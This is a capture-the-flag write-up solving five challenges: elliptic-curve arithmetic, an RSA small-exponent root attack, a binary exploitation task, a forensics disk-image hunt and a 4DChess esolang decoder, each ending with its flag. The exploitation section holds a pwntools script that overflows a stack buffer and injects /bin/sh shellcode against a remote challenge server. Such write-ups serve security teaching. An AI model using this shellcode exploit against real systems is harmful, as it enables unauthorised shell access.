# Elliptical fun
You are given an elliptical curve `Y^2 = X^3 + 12X + 34` and mod value `97`. Given points `P = (88,78), Q = (6,15), R = (68,56)` . `Z = (P*7981)+Q+R` 
Flag format - `flag{Z.x,Z.y,0/1}` 
0 -Z doesn’t fall on the curve 
1 - Z falls on the curve 
For example if Z is (3,4) and falls on an arbitrary curve then flag{3,4,1}

Okay we use a script to solve this -
```python
from sage.all import *
class Point:
	def __init__(self,x,y,p):
		F = GF(p)
		self.x = F(x)
		self.y = F(y)
		self.modulus = p

def addition(p1 : Point, p2: Point, a,b):
	x1 = p1.x
	x2 = p2.x
	y1 = p1.y
	y2 = p2.y

	if x1 == x2 and y1 == y2:
		lamda = (3*x1**2 + a) / (2*y1)
	else:
		lamda = (y2 - y1) / (x2 - x1)
	x = lamda**2 - x1 - x2
	y = lamda*(x1 - x) - y1
	return Point(x,y,p1.modulus)
def scalar_multiplication(p: Point, n,a,b):
	q = p
	r = 0
	while n > 0:
		if n % 2 == 1:
			try:
				r = addition(r,q,a,b)
			except:
				r = q
		q = addition(q,q,a,b)
		n = n//2
	return r 

P = Point(88,78,97)
Q = Point(6,15,97)
R = Point(68,56,97)
a = scalar_multiplication(P,7981 ,12,34)
q = addition(a,Q,12,34)
r = addition(q,R,12,34)
assert r.y**2 == r.x**3 + 12*r.x + 34
print(r.x,r.y)
```
You can use an online sage compiler or setup sage on your system. But here's the link for the [online compiler](https://sagecell.sagemath.org/).
On evaluating we get `47 90` as output with no assert error. Which implies it falls on the curve.
Hence flag - **`flag{47,90,1}`**


# Builder Bob and Alice
The challenge says 2 halves are encrypted with different **small public exponent**. So we divide the cipher text into 2 halves according to the note such that the first half has one more digit than the second.
Thus we brute force values of public exponent(e).
Here's a python script for the same -

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long
from sympy import S, root
ae = 6816757091858450713085690252512347544504019090609136967666012536910668779032690738201677981582888147117790777001276494880477034335888222339694782504925201944152400204217868050833169761970085965835517836485347672132736182362048602797612388464234872640680203246344040430752729725866469640024804817401228056815264532786222257534137077857320585835468143799994851067893825516775648874242756556412751046504386805623134325053594726350972470892897034898778122459853506312633039838182406191024230543812462040887558898777350457961388462592725658336283298460462754161276349420659463594405833841506832238806897758048324572264352921168937532872240116078334406953509150666924242152008508964936855096077208991807624087321478302356034420558971103857098385561867562975635214236812800319136802018308447502622697477966093910155065332671

be = 284403448357012400487440815268570393629291516009482128935860645772817104242195770352886952199727634356396948946904292267800746086172110619652134530644005241578093373346987533481814478956995285094892473531918284742365038199219063895278285241311129050962208373723371805045291276504183072882423921817067005263443085375074582840968538966115900393261136046198045584007907022276019405263042572669644265445973170980765539862996063837828496703377851050924225781574419671909528649345189218547326701840547365637401411646187639905020200750542337358429141073104384731457123561178933963405630674052158068350587514709553433517916924726502866911807936827721753468888786760123822894176681874942836240564975529093940533209640415185370773665478992394074445215255219935337206612590049043325923653904985261439779180089254361804767607973

for i in range(1,100):   
   res = root(S(ae), i)
   try:
   # Attempt to convert the long number to bytes
         result_bytes = long_to_bytes(res)
         print(result_bytes)
   except Exception as e:
   # Print the error message and continue
         print(f"An error occurred: {e}")

```

Just replace `ae` with `be` to get the second half of the flag.

**`flag{DEcrYpT10N_sUccessFul$.@#?_.@#d_att4cK_3421}`**

# The Physicist's Quest
On reversing in Ghidra we see that the first step is integer overflow. We input the max positive integer value and 1 so that it overflows to a negative integer. The second part is shell code execution. We need to send in our shell code and apply appropriate payload first filling up the stack and overwrite them and inject the shell code.
Here is the script for the same -
```python
from pwn import *

context.binary = binary = "./challenge"
# context.log_level = "debug"
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
#p = process("./challenge")
p = remote('rvcechalls.xyz', 29639)
p.recv()
p.sendline(str(2147483647).encode())  # Sending the maximum positive signed integer value
p.sendline(str(1).encode())
output = p.recvuntil(b"Meet us in secrecy at ")
buf_ad = int(p.recvline().strip(), 16)
payload = shellcode + b"A" * (0x60 - len(shellcode)) + b"B" * 0x08 + p64(buf_ad)
p.sendline(payload)
p.interactive()
```

**`flag{Gre4t_Y0u_h3lp4d_h1m_TBBT}`**

# Operation Woofenstein

The first step is to extract the image, it gives you a zip file `snuggles.zip`.  Then on extracting the zip file we see a snuggles folder. But you can see the contents here -
```bash
$ binwalk -e snuggle.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v1.0 to extract, name: snuggles/
67            0x43            Zip archive data, at least v1.0 to extract, name: snuggles/notsnuggles/
146           0x92            Zip archive data, at least v1.0 to extract, name: snuggles/aerosol/
221           0xDD            Zip archive data, at least v1.0 to extract, name: snuggles/snuggles/
297           0x129           Zip archive data, at least v1.0 to extract, name: snuggles/snuggles/snuggless/
383           0x17F           Zip archive data, at least v2.0 to extract, compressed size: 58182, uncompressed size: 102864, name: snuggles/snuggles/snuggless/flag.jpg
58659         0xE523          Zip archive data, at least v1.0 to extract, compressed size: 72, uncompressed size: 72, name: snuggles/snuggles/snuggless/...
58820         0xE5C4          Zip archive data, at least v1.0 to extract, name: snuggles/.../
58891         0xE60B          Zip archive data, at least v1.0 to extract, compressed size: 53, uncompressed size: 53, name: snuggles/.../...
59837         0xE9BD          End of Zip archive, footer length: 22

```
Observe that `...` and `...` are seen a lot. starting a folder/file name with a `.` makes it hidden. So we need to `ls -al` and not just `ls` to see the contents.
```bash
$ ls -al
total 24
drwxr-xr-x 6 ananya ananya 4096 Jun 21 18:18 .
drwxrwxr-x 3 ananya ananya 4096 Jun 26 19:31 ..
drwxr-xr-x 2 ananya ananya 4096 Jun 21 18:18 ...
drwxr-xr-x 2 ananya ananya 4096 Jun 21 18:14 aerosol
drwxr-xr-x 2 ananya ananya 4096 Jun 21 18:14 notsnuggles
drwxr-xr-x 3 ananya ananya 4096 Jun 21 18:14 snuggles
```
we see `...`
on entering and `ls -al` again

```bash
$ ls -al
total 12
drwxr-xr-x 2 ananya ananya 4096 Jun 21 18:18 .
drwxr-xr-x 6 ananya ananya 4096 Jun 21 18:18 ..
-rw-r--r-- 1 ananya ananya   53 Jun 21 18:18 ...
└─$ cat ...
2^kGaJ3o/jC3B$?J<o;HBz5E:<iXC1RSFC_$0e^S:q]A?g3a4guD
```

But when you actually use `exiftool` on the parent image, it has a user comment that says `ninetytwo` in `rot13`. 
Decrypting using base92 we get a drive link - `/folders/1lJwLRBWnnDQdayQAgmlJyXTkTaRfI5WR`

We see a disk image. On downloading the image, we can either mount or use ftk imager.
I will be mounting it -
```bash
$ sudo mkdir /mnt/iso     
$ sudo mount -o loop Downloads/finaldiscimage.iso /mnt/iso

mount: /mnt/iso: WARNING: source write-protected, mounted read-only.
$ ls
bin  etc  home  lib  lost+found  proc  root  snap  usr  var
$ cd home
$ ls
bazing  bazinga  santa  snuggles  viciousmoon  whales
$ cd snuggles
$ ls
flag  nottheflag
$ cd nottheflag
$ ls
flag.tiff
```
On viewing the image, we see the flag is very faint in the background. So we copy the image and view it on aperisolve.
```bash
$ cp /mnt/iso/home/snuggles/nottheflag/flag.tiff flag.tiff
```

**`flag{snugGles_found_h4ppy}`**

# Time revind tactics
The challenge is named so and refers to time, the 4th dimension. The challenge also refers to a board and moves. So it refers to the esolang 4DChess. But since 4DChess was a derivative of `brainf*ck language` , it can be solved using a decoder from [dcode](https://www.dcode.fr/brainfuck-language) for that.
But the intended way was viewing the esolang in [https://esolangs.org/wiki/4DChess](https://esolangs.org/wiki/4DChess)
and setting up lisp interpreter and giving the text file to a particular function.

```lisp
(deftype octet ()
  "The OCTET type defines a byte composed of eight adjacent bits."
  '(unsigned-byte 8))

(defun interpret-4DChess (code &aux (ip 0))
  "Interprets the piece of 4DChess CODE and returns NIL."
  (declare (type string code) (type fixnum ip))
  (when (plusp (length code))
    (let ((memory  (make-array '(8 8 8 8) :element-type 'octet))  ;; Hypercube.
          (pointer (list 0 0 0 0)))                               ;; Vector (X, Y, Z, W).
      (declare (type (simple-array octet (8 8 8 8)) memory) (type list pointer))
      (symbol-macrolet ((token
                          (when (array-in-bounds-p code ip)
                            (char code ip)))
                        (current-cell
                          (apply #'aref memory pointer)))
        (flet ((move-pointer (by-x by-y by-z by-w)
                (declare (type integer by-x by-y by-z by-w))
                (map-into pointer #'+ pointer (list by-x by-y by-z by-w))
                (unless (apply #'array-in-bounds-p memory pointer)
                  (error "The pointer ~s infringes on the hypercube's bounds." pointer))))
          (loop while token do
            (case token 
              (#\> (move-pointer +1  0  0  0))
              (#\< (move-pointer -1  0  0  0))
              (#\^ (move-pointer  0 +1  0  0))
              (#\v (move-pointer  0 -1  0  0))
              (#\* (move-pointer  0  0 +1  0))
              (#\o (move-pointer  0  0 -1  0))
              (#\@ (move-pointer  0  0  0 +1))
              (#\? (move-pointer  0  0  0 -1))
              (#\+ (incf current-cell))
              (#\- (decf current-cell))
              (#\. (write-char (code-char current-cell)))
              (#\, (format T "~&Please input a character: ")
                   (setf current-cell (char-code (read-char)))
                   (clear-input))
              (#\[ (when (zerop current-cell)
                     (incf ip)
                     (loop with level of-type integer = 0 do
                       (case token
                         (#\[ (incf level))
                         (#\] (if (zerop level)
                                (loop-finish)
                                (decf level)))
                         (otherwise NIL))
                       (incf ip))))
              (#\] (unless (zerop current-cell)
                     (decf ip)
                     (loop with level of-type integer = 0 do
                       (case token
                         (#\] (incf level))
                         (#\[ (if (zerop level)
                                (loop-finish)
                                (decf level)))
                         (otherwise NIL))
                       (decf ip))))
              (otherwise NIL))
            (incf ip)))))))
```

`flag{sh3ld0n_w0uLd_B3_PrOud_4D}` is the flag.